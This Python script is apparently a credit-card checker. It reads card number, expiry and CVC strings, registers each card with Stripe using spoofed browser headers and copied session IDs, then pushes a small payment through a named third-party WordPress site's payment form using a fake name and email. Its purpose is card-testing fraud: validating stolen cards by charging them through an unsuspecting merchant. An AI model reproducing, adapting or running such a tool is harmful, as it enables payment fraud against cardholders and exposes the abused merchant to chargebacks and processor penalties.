import requests
import re

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]
    
    r = requests.session()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': '6510bfda-7671-4bbf-90d1-506145a864c5af715c',
        'muid': '2cad18e8-9934-4a7e-a85b-02c71c979d6e911f1e',
        'sid': '2d87537f-3e2d-483c-bd5a-1182bca891490f4beb',
        'payment_user_agent': 'stripe.js/560413f346; stripe-js-v3/560413f346; card-element',
        'referrer': 'https://business-umbrella.com',
        'time_on_page': '658559',
        'key': 'pk_test_your_test_key_here',  # Replace with your Stripe test public key
    }

    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    try:
        response = r1.json()
        if 'id' in response:
            pm = response['id']
        else:
            raise KeyError("No 'id' in Stripe response")
    except (KeyError, ValueError) as e:
        print(f"Stripe API error: {str(e)} - Response: {r1.text}")
        return {"error": {"message": str(e)}}

    cookies = {
        '_ga': 'GA1.1.2083525950.1743696868',
        '__stripe_mid': '2cad18e8-9934-4a7e-a85b-02c71c979d6e911f1e',
        'twk_idm_key': 'FGUynD44DTzBdLHqXc3y4',
        '__stripe_sid': '2d87537f-3e2d-483c-bd5a-1182bca891490f4beb',
        'TawkConnectionTime': '0',
        '_ga_2F3E3CB616': 'GS1.1.1744938504.2.1.1744938661.0.0.0',
    }

    headers = {
        'authority': 'business-umbrella.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://business-umbrella.com',
        'referer': 'https://business-umbrella.com/candidate-services/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        't': '1744939313811',
    }

    data = {
        'data': '__fluent_form_embded_post_id=2972&_fluentform_3_fluentformnonce=bf70f11e90&_wp_http_referer=%2Fcandidate-services%2F&names%5Bfirst_name%5D=Naofumi&names%5Blast_name%5D=Iwatani&email=Jadhkmeb%40gmail.com&dropdown_1=Training%20booking%20for%20candidates&custom-payment-amount_8=5&payment-coupon=&payment_method=stripe&__ff_all_applied_coupons=&pum_form_popup_id=720&__entry_intermediate_hash=5cf7cc2f6710372bf8a7ed6d643141fb&__stripe_payment_method_id=' + str(pm),
        'action': 'fluentform_submit',
        'form_id': '3',
    }
    
    r2 = requests.post(
        'https://business-umbrella.com/wp-admin/admin-ajax.php',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    return r2.json()